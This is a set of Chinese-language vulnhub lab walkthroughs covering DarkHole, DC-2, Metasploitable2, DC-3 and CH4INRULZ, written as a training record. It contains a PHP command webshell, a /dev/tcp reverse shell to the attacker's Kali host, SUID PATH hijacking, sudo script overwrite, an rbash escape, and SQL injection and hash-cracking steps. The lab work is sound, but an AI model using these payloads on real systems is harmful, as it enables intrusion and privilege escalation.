#### 参考链接：

[[ vulnhub靶机通关篇 \] 渗透测试综合靶场 DarkHole:1 通关详解 (附靶机搭建教程)\_darkhole靶机-CSDN博客](https://blog.csdn.net/qq_51577576/article/details/143489714)

同上面操作一样，先进行nmap进行靶机目标网段（192.168.40.0/40）的存活主机探测

nmap显示出存活主机之后，根据nmap显示的存活主机的主机名结合已知设备ip排除确定靶机。如果靶机环境设置为`nat模式`确定靶机ip会比较容易

AI梳理：

### 第一阶段：Web 入口突破 (Logic Flaw)

这一关的核心不在于暴力破解，在于利用业务逻辑漏洞修改管理员密码。

1. **注册与发现**
   - 访问 `http://靶机IP/register.php` 注册一个普通账号。
   - 登录后发现有“修改密码”的功能。
2. **IDOR 越权攻击 (关键点)**
   - **操作**：使用 Burp Suite 拦截“修改密码”的请求。
   - **修改**：将请求参数中的 `id=你的ID` 修改为 `id=1` (通常 Admin 的 ID 是 1)。
   - **结果**：你成功修改了管理员的密码，随后使用 `admin` 和新密码登录后台。
3. **获取上传权限**
   - 登录 Admin 后，你获得了普通用户看不到的 **文件上传** 功能。

---

### 第二阶段：获取初始 Shell (RCE)

这一步是将 Web 访问权转化为服务器控制权的关键，也是最容易出错的地方。

1. **绕过上传限制**
   - **检测**：系统过滤了 `.php` 后缀。

   - **绕过**：使用 `.phtml` 后缀，这种文件通常也会被 Apache 当作 PHP 解析。

   - **Payload (一句话木马)**：

     PHP

     ```
     <?php system($_GET["x"]); ?>
     ```

     将其保存为 `test1.phtml` 上传。

2. **构造反弹 Shell (重点/易错点)**
   - **原理**：利用刚才上传的一句话木马，通过 URL 参数 `x` 传递一个让靶机连接你 Kali 的命令。

   - **准备监听 (Kali)**：

     Bash

     ```
     nc -lvnp 8888
     ```

   - **构造命令 (Kali)**： 你需要构造 `bash -i >& /dev/tcp/你的KaliIP/8888 0>&1`。 **⚠️ 坑点注意**：
     1. **URL 编码**：命令中包含 `&`, `/`, `空格` 等特殊字符，必须进行 URL 编码，否则浏览器无法正确传输。
     2. **IP 地址**：命令里的 IP 必须是 **Kali 的 IP** (`192.168.40.128`)，而不是靶机的 IP。

   - **执行**： 在浏览器访问：`http://靶机IP/upload/test1.phtml?x=URL编码后的反弹命令`。

3. **稳定 Shell**
   - 连接成功后，执行 `python3 -c 'import pty; pty.spawn("/bin/bash")'` 获得交互式 Shell。

---

### 第三阶段：横向移动 (www-data -> john)

此时你是 `www-data` 权限，需要变成普通用户 `john`。

1. **发现 SUID 文件**
   - 通过 `find / -perm -u=s ...` 发现可疑文件 `/home/john/toto`。

2. **分析漏洞**
   - 该程序以 root 权限运行，但内部逻辑是先切到 `john` 用户，然后执行 `id` 命令。
   - 关键在于它调用 `id` 时**没有使用绝对路径** (如 `/usr/bin/id`)。

3. **环境变量劫持 (PATH Hijacking)**
   - **思路**：创建一个假的 `id` 文件，并把当前目录加入环境变量 `$PATH` 的最前面。

   - **操作**：

     Bash

     ```
     cd /tmp
     echo "/bin/bash -p" > id   # 伪造 id，内容是启动 bash
     chmod +x id                # 给执行权限
     export PATH=/tmp:$PATH     # 劫持环境变量
     /home/john/toto            # 触发漏洞
     ```

   - **结果**：你变成了用户 `john`。

---

### 第四阶段：最终提权 (john -> root)

1. **信息收集**
   - 运行 `sudo -l` 发现需要密码。
   - 查看目录 `ls -la /home/john`，发现隐藏文件 `password`。
   - 读取文件 `cat /home/john/password` 获得密码 (如 `root123`)。

2. **Sudo 配置漏洞**
   - 输入密码后再次运行 `sudo -l`，发现可以无密码以 root 身份运行 `/home/john/file.py`。
   - **关键权限**：该脚本文件 `file.py` 对 `john` 用户是 **可写** 的 (`-rwxrwx---`)。

3. **利用与提权**
   - **操作**：直接修改脚本内容，写入启动 Shell 的 Python 代码。

     Bash

     ```
     echo 'import os; os.system("/bin/bash")' > /home/john/file.py
     ```

   - **执行**：

     Bash

     ```
     sudo /usr/bin/python3 /home/john/file.py
     ```

   - **结果**：获得 Root Shell，读取 `/root/root.txt`。

### 自己的思路：

#### 1. 获取反向shell:

...

**操作：**

- 将 `id=2` (或是你的当前ID) 改为 `id=1`。
- 点击 Burp 顶部的 **"Forward"** 发送请求。

**验证提权**

1. 关闭 Burp 的拦截 (`Intercept is off`)。

2. 在网页上点击 `Logout` 退出当前账号。

3. 尝试登录管理员账号：
   - **Username:** `admin` (常见管理员用户名)
   - **Password:** `123456` (你刚刚修改的密码)

   发现存在文件上传的地方，尝试上传文件，发现做了文件检验，但也没有完全做。限制上传php后缀的文件，但我修改成pHp后缀就能上传，并不是只允许上传`jpg,png,gif`文件。并且发现这里上传的文件就保存之前扫描目录结构的`/upload`目录下。

   上传过程中发现phtml文件可以上传成功，可以利用这种类型文件执行php代码。phtml文件可以同时包含html文件和php代码。新建一个test1.phtml上传。

**创建文件** 由于目标可能过滤了 `.php` 后缀，我们按照教程使用 `.phtml`。

```

- **解释：** 这行代码的意思是，这个文件会接收 URL 中名为 `x` 的参数，并在服务器上当作系统命令执行。

**2. 在浏览器中：上传文件**

- **复制这一长串字符。**

#### 2. 提权：

虽然 `toto` 文件是 root 所有的，但根据你最初运行它的输出来看（`uid=1001(john)`），这个程序内部的代码逻辑应该是：**先降权到 `john` 用户，然后再执行 `id` 命令。**

所以，通过劫持 `id`，你成功完成了**横向移动 (Lateral Movement)**，从 `www-data` 变成了普通用户 **`john`**。

现在的目标是从 **`john`** 提权到 **`root`**

##### 检查 John 的 Sudo 权限 (最可能的提权点)

我们需要查看 `john` 用户是否可以以 `root` 身份运行某些特定的命令（有时不需要密码）。

请执行：

Bash

```
sudo -l
```

##### 检查 John 的秘密文件

如果 `sudo -l` 需要密码，看看 John 的目录里有没有藏着密码文件。

Bash

```
ls -la /home/john
```

- 留意文件名叫 `password`, `creds`, `.ssh` 等的文件。

##### 读取密码文件

看看这里面写了什么，这很可能就是 John 的系统密码。

Bash

```
cat /home/john/password
```

_(假设输出是 `root123` 或者其他字符串，请记下来)_

#### 3. 局势分析：

**权限确认：** `sudo -l` 的结果明确告诉你：你可以用 `root` 权限去运行 `/home/john/file.py` 这个脚本。 _命令：`sudo /usr/bin/python3 /home/john/file.py`_

**文件权限：** 你之前用 `ls -l` 看过，`file.py` 对你（John）是**可写**的 (`-rwxrwx---`)。

**漏洞利用：** 既然你可以修改这个文件，又可以以 root 身份运行它，那么你只需要把“启动 Shell”的代码写入这个文件，然后让系统帮你运行，你就变成了 Root。

##### 修改脚本

我们将一段 Python 代码写入 `file.py`，这段代码的作用是调用系统命令启动一个 Bash Shell。

Bash

```
echo 'import os; os.system("/bin/bash")' > /home/john/file.py
```

##### 第二步：触发漏洞

使用 `sudo` 以 root 身份运行这个脚本。

Bash

```
sudo /usr/bin/python3 /home/john/file.py
```

##### 第三步：夺取 Flag

如果上一条命令执行后，你的提示符变成了 `#` (或者看起来没变但其实已经是 root 了)，立刻验证身份并读取最终的 Flag。

Bash

```
id
cat /root/root.txt
```

### 📝 核心注意事项总结

1. **关于反弹 Shell**：
   - 永远分清 **攻击机 (Kali)** 和 **靶机**。监听在 Kali 做，反弹命令发给靶机去跑。
   - 遇到 URL 传参执行命令时，**必须**做 URL 编码。
2. **关于提权思路**：
   - **SUID**：重点看是不是调用了系统命令（如 `ps`, `ls`, `id`），如果是且没写全路径，就是环境变量劫持。
   - **Sudo**：如果允许运行脚本（`.py`, `.sh`），第一时间看**有没有写权限**。如果有，直接覆盖脚本内容为提权代码。
3. **关于环境**：
   - 如果 Shell 卡死或断开，重新在 Web 端触发一下 URL 请求，记得 Kali 端要重新开启 `nc` 监听

#### 工具wpscan

这是一个wordpress站，我们采用专门针对wordpress的工具wpscan来进行扫描。

WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能该扫描器可以实现获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的Wordpress站点暴力破解用户名密码。

Wpscan一些常用语句：

```
wpscan --url http://dc-2

wpscan --url http://dc-2 --enumerate t 扫描主题

wpscan --url http://dc-2 --enumerate p 扫描插件

wpscan --url http://dc-2 --enumerate u 枚举用户

在 Linux 系统中，rbash（restricted bash）是一种限制性的 shell 环境，它限制了用户执行某些命令和操作的能力。这通常用于提高安全性，防止用户执行可能对系统造成危害的命令。然而，在渗透测试或系统管理中，有时需要绕过这些限制来执行必要的操作。
在flag3中提示我们需要提权，但无法直接使用su命令提权到jerry，现在我来尝试rbash绕过，查看一下可以使用的命令：我们无法切换目录往往是因为权限不够，那我们现在尝试使用echo来绕过rbash：

```bash
BASH_CMDS[a]=/bin/sh;a
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin
echo /*
```

这段代码是用来在受限的 shell 环境中（如 rbash）绕过一些限制，以执行非限制性命令的技巧。下面是每行代码的解释：
**BASH_CMDS[a]=/bin/sh;a**
BASH_CMDS 是一个环境变量，通常在 rbash 环境中用来定义允许执行的命令列表。
这行代码将 /bin/sh 添加到 BASH_CMDS 环境变量中，使得 sh 命令可以被执行。
a 是一个变量，这里将其赋值为 /bin/sh，然后在命令的末尾调用它（a），从而执行 /bin/sh。
**export PATH=$PATH:/bin/**
这行代码将 /bin/ 目录添加到当前用户的 PATH 环境变量中。
PATH 环境变量定义了系统在哪些目录中查找可执行文件。
通过添加 /bin/ 到 PATH，用户可以尝试执行 /bin 目录下的任何命令，即使这些命令在 rbash 中通常是被限制的。
**export PATH=$PATH:/usr/bin**
类似于上一行，这行代码将 /usr/bin 目录也添加到 PATH 环境变量中。
/usr/bin 是另一个包含许多系统命令的目录，这样做可以进一步增加可执行命令的范围。
**echo /\***
这行代码看起来像是一个示例或测试命令，它的作用是打印出根目录（/）下的所有文件和目录名称。
在 rbash 中，如果限制了对 ls 命令的使用，这个命令可以作为一个替代方法来列出目录内容。
这段代码的目的是为了在受限的 shell 环境中获取更多的自由度，以便能够执行更多的命令

### 六、Metasploitable2使用指南

参考链接：https://www.cnblogs.com/lsgxeva/p/8450283.html

Metasploitable2 更像一台“漏洞练习册”，不是单一路径拿 flag 的靶机。它的重点是练 **信息收集、服务识别、弱口令、错误配置和经典公开漏洞**，建议按“先探测端口，再选典型服务逐个练”的顺序来。

#### 基本准备

- 默认系统账号：`msfadmin / msfadmin`
- 靶机启动后先在控制台执行 `ifconfig` 确认 IP。
- 网络建议使用 `Host-only` 或实验室 NAT，**不要直接桥接到真实办公/家庭网络**。
- 先做一遍全端口扫描，别只扫前 1000 个端口：

```
nmap -sV -A -p- <靶机IP>
```

常见高频端口包括：`21`、`23`、`80`、`139/445`、`1524`、`2049`、`3306`、`3632`、`5432`、`6667`、`8180`。

#### 建议练习顺序

1. **先拿最容易验证的入口**：`1524/tcp`、`21/tcp`、`6667/tcp`
2. **再练错误配置**：`2049/tcp` 的 NFS、`139/445` 的 Samba
3. **最后练应用层**：Web 页面、DVWA、Mutillidae、数据库默认口令

这样做的好处是：前面几条链子反馈快，容易建立对这台靶机的整体认识，后面再去练 Web 和数据库时不容易迷路。

#### 高频入口整理

- **1524/tcp - ingreslock**：这是最直接的入口，`telnet <靶机IP> 1524` 往往就是 root shell。  
  **坑点**：很多人扫到 `1524` 只觉得“奇怪端口”，直接忽略了，实际上这往往是最快的验证点。

- **21/tcp - vsftpd 2.3.4**：这是经典“笑脸后门”。核心思路是先与 `21` 端口交互，再去连 `6200`。
  **坑点**：不是直接连 `6200` 就有 shell，必须先触发后门；如果 `6200` 没开，通常是前一步没触发成功。

- **6667/tcp - UnrealIRCd**：可直接利用公开后门拿 shell，很多 writeup 会用 Metasploit。
  **坑点**：老文章常写 `set RHOST`，新版本 Metasploit 往往要用 `RHOSTS`；另外 `LHOST` 必须填你 Kali 的 IP。

- **2049/tcp - NFS**：`showmount -e <靶机IP>` 如果看到 `/` 被导出，说明可以尝试挂载根目录，往 `/root/.ssh/authorized_keys` 写入公钥。
  **坑点**：攻击机如果没有装 NFS 相关工具，`mount` 会报错；另外写不进去时别急着怀疑方法错，先确认是否是权限或挂载参数问题。

- **139/445 - Samba**：既可以匿名枚举共享，也可以顺着错误配置做目录穿越/敏感文件读取。
  **坑点**：很多人只盯着“远程命令执行”，却忽略了“读配置、读口令、读用户列表”本身就足够打通后续链路。

#### 练习时要记住的点

- 这台靶机暴露的服务非常多，**核心不是一把梭，而是学会判断哪条路最短、哪条路最稳**。
- 默认口令很多：如系统账号 `msfadmin/msfadmin`，PostgreSQL 常见 `postgres/postgres`，MySQL 常见 `root` 空口令，VNC 常见 `password`。
- Web 入口不要只看首页，`http://<靶机IP>/mutillidae/`、`http://<靶机IP>/dvwa/` 都值得单独访问。
- 把 Web 应用玩坏了也别慌，像 Mutillidae 这类应用通常可以重置数据库后继续练。

#### 常见踩坑点总结

- **把 Metasploitable2 当成单一路径 CTF**：它更像漏洞实验台，不是“只找一条 root 路线”。
- **只扫常规端口**：不扫全端口很容易漏掉 `1524`、`3632`、`6667`、`8180` 这些关键入口。
- **RHOST/LHOST 配错**：`RHOST(S)` 是靶机，`LHOST` 是 Kali，本地监听 IP 填反会导致模块一直卡住。
- **环境没隔离**：这台机器是故意做得很脆弱的，放进真实网络等于主动引入风险。

https://blog.csdn.net/Cute_love_you/article/details/146222388

DC-3 这一关的主线很清楚，适合拿来练“**从 Web 指纹识别到后台控制，再到本地提权**”这一整条链。  
它不像有些靶机会给你很多支线入口，`DC-3` 基本是围绕 Joomla 展开，所以做这关时最重要的是：**先确认 CMS 和版本，再围绕这个版本找利用点**，不要被无效目录和假线索带偏。

#### 先解释几个后面会遇到的词

- **Joomla**：一个常见的内容管理系统（CMS），可以理解成“建站程序”。
- **Joomscan**：专门识别 Joomla 信息的工具，能帮你判断版本、组件和一些已知风险点。
- **SQL 注入**：把输入当成数据库语句的一部分来处理，导致数据库被额外查询或泄露数据。
- **sqlmap**：自动化检测和利用 SQL 注入的工具，常用来做验证、枚举数据库和导出数据。
- **John（John the Ripper）**：离线密码破解工具，把哈希交给它后，它会尝试恢复原始密码。

#### 整体思路

这关可以分成四步理解：

1. **确认入口**：先看开放了什么端口，确认主入口是不是 Web。
2. **确认框架**：判断网站是不是 Joomla，以及版本大概是多少。
3. **确认后台凭据来源**：不是去猜管理员密码，而是从数据库里把账号信息找出来。
4. **确认提权方向**：低权限拿到后，不要乱试，先根据系统版本判断本地提权路线。

这样做的好处是：整条路线会比较稳，不容易在目录扫描、弱口令猜测这些分支上浪费时间。

#### 第一阶段：先确定这关到底考什么

先做端口扫描，确认目标对外暴露了哪些服务：

```
nmap -A -sV -p- <靶机IP>
```

Purpose: 看开放端口、服务版本和系统指纹，先判断主入口在哪里。

DC-3 的典型情况是：**几乎所有关注点都会落到 `80/tcp`**。  
这说明它不是一台“多服务并行突破”的靶机，而更像是**围绕 Web 打一条主线**。

这一步最重要的判断不是“还有没有别的端口”，而是：

- 主要入口是不是 Web；
- 有没有明显 CMS 痕迹；
- 后面要不要把精力集中到一个点上。

#### 第二阶段：为什么先确认 Joomla 版本

打开网站后，很多人会马上开始扫目录。  
但这关更高效的思路是：**先做指纹识别，再决定怎么扫**。

可以用：

```
joomscan -u http://<靶机IP>
```

Purpose: 识别 Joomla 版本、组件和一些已知漏洞线索。

这里的原理很简单：  
如果你已经知道目标是 Joomla，而且版本比较老，那么后面就不需要盲打所有 Web 漏洞，而是可以**把注意力集中到这个版本公开已知的问题上**。

很多 DC-3 的 writeup 都会把版本定位到 `Joomla 3.7.0` 左右。  
这个版本之所以关键，是因为它有一类和 `com_fields` 组件相关的 SQL 注入问题。  
所以这一步真正的意义不是“记住版本号”，而是：

- 版本能不能和公开漏洞对上；
- 漏洞是不是数据库泄露型；
- 泄露出来的数据能不能转化为后台登录凭据。

#### 第三阶段：为什么这关不是先猜密码，而是先拿哈希

确定版本后，很多人会本能地去做：

- 爆破后台；
- 扫更多目录；
- 找上传点。

但 DC-3 的正路通常不是这样。  
它更像是：**先通过 SQL 注入拿数据库里的管理员信息，再把哈希恢复成口令。**

这里先要理解一个概念：  
数据库里通常不会直接明文存密码，而是存**哈希**。  
哈希可以理解成“密码经过单向处理后的结果”，系统拿它来验证，而不是直接保存明文。

这时就轮到 **sqlmap** 和 **John** 出场：

```
sqlmap -u "目标URL" --batch
```

Purpose: 自动验证是否存在 SQL 注入，并继续做数据库枚举。

```
john hash.txt
```

Purpose: 对导出的密码哈希做本地离线尝试恢复。

这一阶段最值得记住的不是具体参数，而是思路：

1. 先确认注入是否成立；
2. 再枚举数据库、表、字段；
3. 找到管理员相关表；
4. 导出用户名和哈希；
5. 在本地恢复口令。

也就是说，这一关的后台口令不是“猜出来的”，而是**数据库先泄露，再转化出来的**。

#### 第四阶段：遇到 Joomla 用户表时要注意什么

很多 writeup 都会提到用户表名类似 `#__users`。  
这里有一个非常容易踩的坑：  
**`#__users` 只是 Joomla 文档或文章里常用的占位写法，不一定是目标数据库里的真实表名。**

真正正确的理解是：

- `#_` 只是前缀占位；
- 真实环境里可能是别的前缀；
- 所以不能直接照抄文章里的表名。

这一点为什么重要？  
因为很多人会误以为“漏洞没打通”，其实只是查错了表。  
所以在实操里，表名前缀要以**目标数据库实际枚举结果**为准，而不是以博客里的示例为准。

#### 第五阶段：John 在这一关里到底扮演什么角色

当你拿到管理员哈希后，下一步通常不是立刻能进后台。  
你需要先把这串哈希转成可用口令，这就是 **John** 的作用。

John 的定位很重要：

- 它不是在线爆破后台；
- 它不是直接对靶机发请求；
- 它是在你自己的机器上，对已经导出的哈希做离线尝试。

所以这一阶段的本质是：

- SQL 注入负责“把数据拿出来”；
- John 负责“把哈希变成口令”；
- Joomla 后台登录负责“把数据利用起来”。

如果把这三步拆开理解，整条链就很顺了。

#### 第六阶段：进入后台后为什么优先想到模板

进入 Joomla 后台后，很多人会去翻插件、用户、媒体管理。  
但在这关里，更值得关注的是 **模板管理**。

原因是：  
模板本质上就是网站页面渲染的一部分，如果后台允许编辑模板文件，那么它往往意味着：

- 你可以修改服务器上的 Web 文件；
- 修改后的内容可能直接被 Web 服务器解释执行；
- 这会把“后台权限”转成“服务器执行能力”。

这也是为什么很多 writeup 会把重点放在 `Templates` 模块。  
真正需要理解的不是某个文件名，而是这个逻辑：

**后台文件编辑权限 -> 可控服务器端代码 -> 拿到低权限 shell**

这一步在 DC-3 里很关键，因为它是从“网站管理员”走向“系统用户”的桥梁。

#### 第七阶段：拿到低权限后，不要先问 sudo，要先问版本

当你已经从后台跳到服务器权限后，这时最容易犯的错误是：

- 立刻 `sudo -l`
- 到处翻 SUID
- 随便找一个 exp 就跑

DC-3 更稳的思路是先做基本信息确认：

```
uname -a
```

Purpose: 确认内核版本，决定后续本地提权该往哪条路查。

```
searchsploit linux kernel <版本关键词>
```

Purpose: 先查与当前内核接近的公开提权方向，而不是盲目尝试。

很多 DC-3 环境会落在较老的 Ubuntu 内核上，所以后续常常会转向经典本地提权。  
这里最该学会的是**筛选思路**：

1. 先确认版本；
2. 再找匹配范围；
3. 再判断 exploit 的适用条件；
4. 最后才考虑是否尝试。

这比“看见提权 exp 就直接运行”更像真正的渗透流程。

#### 这一关最容易踩的坑

- **目录扫描结果太多，被假阳性带偏**：有些页面即使不存在也会返回 `200`，所以目录工具扫出很多结果时，不代表都值得深挖。

- **把 `#__users` 当成真实表名**：这只是 Joomla 的占位写法，真实表名前缀要以枚举结果为准。

- **拿到哈希后格式处理错误**：哈希文件里多了空格、表格符号或额外文本，John 就可能识别失败。

- **把后台口令误当成系统口令**：这关拿到的密码首先服务于 Joomla 后台登录，不一定能直接用于 SSH。

- **只会改模板，不理解为什么模板能用**：关键不在于“改哪个文件”，而在于后台能写服务器端模板文件这件事本身。

- **一拿到低权限就死磕 sudo**：这关更常见的正路是按内核版本走本地提权，而不是先把全部希望放在 sudo 配置上。

#### 简短总结

DC-3 很适合用来训练一个很重要的思维：  
**先缩小技术栈范围，再围绕这个技术栈去找最短利用链。**

这关里整条逻辑可以这样记：

- `Nmap` 告诉你主要入口就是 Web；
- `Joomscan` 告诉你这是老版本 Joomla；
- SQL 注入让你把后台账号数据从数据库里拿出来；
- `John` 负责把哈希恢复成口令；
- Joomla 后台的模板编辑能力把后台权限转成服务器权限；
- 最后再按内核版本去找本地提权方向。

所以 DC-3 最值得复盘的，不是某个命令参数，而是这条链为什么会一环扣一环。  
只要理解了“版本识别 -> 数据泄露 -> 后台控制 -> 服务器控制 -> 本地提权”这个节奏，这关就会清晰很多。

### 八、CH4INRULZ

参考链接：

- https://zgjx6.github.io/2019/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E6%9C%BAch4inrulz%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/
- https://blog.csdn.net/weixin_64809022/article/details/131411157
- https://www.hackingarticles.in/ch4inrulz-1-vulnhub-walkthrough/
- https://www.vulnhub.com/entry/ch4inrulz-101,247/

这台靶机更适合按“**先判断主线，再逐步收缩范围**”来做。  
和很多初学者一上来就盯着 FTP 或暴力破解不同，`CH4INRULZ` 的关键其实是：**8011 端口的文件读取功能 + 80 端口开发目录 + 上传点 + 老内核提权**。  
如果前面的线索没有串起来，就会一直卡在“好像哪里都有入口，但哪条都走不通”的状态。

#### 先解释几个后面会遇到的词

- **Nmap**：最常用的端口扫描工具，用来先看目标开了哪些服务。
- **WhatWeb**：一个 Web 指纹识别工具，用来判断网站大概用了什么技术。
- **LFI（本地文件包含）**：简单理解，就是让网站帮你把服务器本地某个文件“读出来”或“包含执行”。
- **`.htpasswd`**：Apache 常见的认证文件，里面通常存的是“用户名 + 密码哈希”。
- **John（John the Ripper）**：离线密码破解工具，把哈希交给它，它会尝试猜出原始密码。

#### 整体思路

这一关不建议一开始就“见服务就打”，而是先做判断：

1. **端口层面看全貌**：知道有哪些面向外部的入口；
2. **Web 层面定主线**：判断是主站 `80` 重要，还是开发接口 `8011` 更关键；
3. **源码/备份里找凭据**：不要只看页面，要看注释、备份、认证信息；
4. **上传和包含联动**：上传成功不等于执行成功，这一关很典型；
5. **提权按版本走**：拿到低权限后，先确认内核，再决定提权方向。

#### 第一阶段：信息收集

先做主机发现和端口扫描，先把“面”铺开，再考虑“点”怎么打：

```
nmap -sS -sV -O -T4 -A <靶机IP>
```

这一关比较关键的端口通常有：

- `21/tcp`：FTP
- `22/tcp`：SSH
- `80/tcp`：主站
- `8011/tcp`：另一个 Web 服务 / API

从参考文章的结果看，FTP 支持匿名登录，SSH 没有明显弱点，真正最值得盯住的是 **80 和 8011 这两个 Web 面**。  
这里的一个重要思路是：**能进不等于有价值**。FTP 虽然能匿名进，但如果没有有效文件，说明它更可能是干扰项。

#### 第二阶段：先做 Web 指纹和目录判断

先看两个 Web 服务分别是什么：

```
whatweb http://<靶机IP>
whatweb http://<靶机IP>:8011
```

这一步的目的不是直接拿漏洞，而是回答两个问题：

- 站点是不是常见 CMS？
- 两个端口是否属于同一套开发体系？

从文章里的现象看，两个站点都不像成熟 CMS，更像是**开发中的自写站点**。  
这种情况下，经验上就要重点留意：

- 目录扫描结果；
- 源代码注释；
- 备份文件；
- `/api`、`/development`、`/test` 这类“开发味很重”的路径。

可以对两个端口分别做目录扫描：

```
dirsearch -u http://<靶机IP>
dirsearch -u http://<靶机IP>:8011
```

这里最重要的不是“扫出得越多越好”，而是**扫出能解释站点结构的路径**。  
在这关里，后续真正有价值的线索通常会落到：

- `8011` 下的 `api`
- `80` 下的 `development`
- 以及主站源码、备份文件、认证相关注释

#### 第三阶段：8011 端口为什么是主线

`8011` 端口最重要的点，在于它暴露了一个文件相关 API。  
从参考文章可以看出，这里有一个很典型、也很容易让人踩坑的地方：

- 页面提示需要一个叫 `file` 的参数；
- 很多人第一反应是用 GET 方式传；
- 但这一关真正生效的方式是 **POST 原始参数**。

这一点特别重要，因为很多新手会卡在这里很久：  
**不是漏洞不存在，而是请求方式错了。**

从原理上讲，这个接口的问题在于：  
它把用户传入的文件路径拿去读取，没有做好严格限制，于是就形成了**本地文件包含 / 任意文件读取**思路。

这一步真正的意义不是“读 `/etc/passwd` 有多炫”，而是三件事：

1. 证明这个接口确实能读服务器本地文件；
2. 说明后续可以继续读取站点源码；
3. 说明以后如果知道上传文件的**绝对路径**，就可能把上传文件也包含进去。

这也是整条链子能成立的基础。

#### 第四阶段：为什么要回头看 80 端口

很多人发现 `8011` 有文件读取后，会一直在那边死磕。  
但这关真正高明的地方是：**8011 给你“读文件”的能力，80 端口给你“可利用的文件和功能”**。

按参考文章的思路，回到 `80` 端口后，重点要做三件事：

1. 看首页和源码有没有注释；
2. 看 `robots.txt` 这类常规路径；
3. 进入 `development` 看是不是有开发中功能。

这里会慢慢拼出一条链：

- 站点是开发中的；
- 开发区用了 `.htpasswd` 做认证；
- 认证信息可能写在注释、源码或备份里；
- 开发区里还有一个上传工具。

也就是说，80 端口不是“另一个普通页面”，而是**整个利用链的后半段舞台**。

#### 第五阶段：遇到 John 之前要先知道自己在破解什么

如果在源码、注释或备份里拿到了类似：

- 用户名；
- 一串 `$apr1$...` 这样的哈希；
- 提示它会被用作 `.htpasswd`

那么这一步的目标就不是“马上登录”，而是先判断：

- 这是不是 Apache Basic Auth 的密码哈希；
- 这是在线登录口令，还是系统账号密码；
- 适合用什么工具离线尝试恢复。

这里就会用到 **John（离线密码破解工具）**。  
它的作用不是“攻击目标机器”，而是拿你已经得到的哈希，在本地字典里做匹配尝试。

常见操作思路如下：

```
echo '<用户名>:<哈希>' > hash.txt
john hash.txt
john --show hash.txt
```

这一阶段最重要的不是命令本身，而是判断：  
**拿到的是哪种哈希，它对应的是哪一层认证。**

在这关里，这个密码最终不是用来登 SSH，而是用来进入 `80` 端口下的开发目录。  
这就是为什么很多人会在“拿到密码后去试 SSH”这一步走偏。

#### 第六阶段：开发目录和上传点的真正价值

进入 `development` 之后，最关键的提示不是页面做得多花，而是它明确告诉你：  
这里有一个“已经写完、但安全审查还没做完”的上传工具。

这类提示在靶机里几乎就是在说：

- 上传功能大概率存在校验缺陷；
- 但未必是“直接上传就执行”；
- 很可能还需要和别的漏洞组合。

这关的典型点就在这里：  
上传功能虽然存在，但上传目录并不是直接当成可执行脚本目录来用。  
所以**上传成功 ≠ 代码执行成功**。

真正应该理解的原理是：

1. 上传功能负责把文件放到服务器上；
2. 文件包含功能负责把这个文件作为本地文件读进来；
3. 两者一结合，才构成后续执行链。

这也是为什么很多 writeup 会强调“不要只会传文件，还要知道文件最终落到哪里”。

#### 第七阶段：为什么绝对路径特别关键

当上传点没有直接返回完整路径时，很多人第一反应是继续爆破目录。  
但这关更稳的思路是：

- 先用文件读取能力找源码；
- 再从源码里看上传目录命名；
- 再结合 Web 根目录常见位置，推断绝对路径。

这一关里，**绝对路径** 很关键，因为 PHP 的 `include` 处理的是服务器本地文件路径。  
也就是说，这里真正有用的是类似：

- `/var/www/...`
- `/var/www/html/...`

这种本地路径，而不是把一个 `http://...` 地址直接丢给包含函数。

这也是很多人会踩的一个典型坑：  
**明明文件已经上传成功，但因为拿的是 URL 不是本地路径，始终触发不了。**

#### 第八阶段：拿到低权限后不要急着乱提权

当你已经进入到 `www-data` 这类 Web 服务权限后，下一步不是马上找 `sudo -l` 一把梭，而是先做版本确认：

```
uname -a
```

这里的意义很大：

- 它能确认 `nmap` 对系统版本的大致判断是否靠谱；
- 它决定你后面查找本地提权路线的方向；
- 它能帮你过滤掉大量“不匹配当前版本”的 exp。

参考文章里这台机器的内核比较老，因此作者后续转向了公开本地提权思路。  
这一步最值得学的不是某个具体 exp 名字，而是这种判断流程：

1. 先拿到准确内核版本；
2. 再用 `searchsploit` 查相邻版本范围；
3. 再判断漏洞类型、编译条件、是否需要交互式 shell；
4. 最后再决定是否尝试。

这比“见到 exp 就下、见到 exp 就跑”靠谱得多。

#### 这一关最容易踩的坑

- **把匿名 FTP 当成主线**：能进不代表有用，文章里最终有效链路并不是从 FTP 打开的。

- **只扫 80 不扫 8011**：这关最关键的漏洞点恰恰在 `8011` 的 API。

- **把 `file` 参数按 GET 去传**：这一关很容易因为请求方式错了，误判为漏洞不存在。

- **拿到哈希就去撞 SSH**：这里的密码更像是开发目录认证，不是系统登录口令。

- **上传成功就以为已经 getshell**：上传目录不解析脚本时，还得结合文件包含才能走通。

- **一直用 URL 去包含文件**：这里真正需要的是服务器本地绝对路径，不是网页访问地址。

- **提权前不做版本确认**：老内核靶机最怕“乱跑 exp”，先确认版本才是正路。

#### 简短总结

CH4INRULZ 这一关非常适合练“**把零散线索串成漏洞链**”：

- `Nmap` 负责告诉你有哪些入口；
- `WhatWeb` 和目录扫描负责判断哪里更值得投入时间；
- `8011` 的文件读取能力负责帮你读源码、读认证线索、找上传落点；
- `John` 负责把拿到的哈希转成能用的认证口令；
- 开发目录里的上传功能负责把文件放上去；
- 文件包含再把上传文件串进执行链；
- 最后再根据内核版本决定提权方向。

如果只看单点，这关每一步都不算特别难；  
但如果不知道前后怎么衔接，就会一直在错误入口上打转。  
所以这关最值得记的不是“哪条命令”，而是**为什么下一步会接着上一条线索出现**。
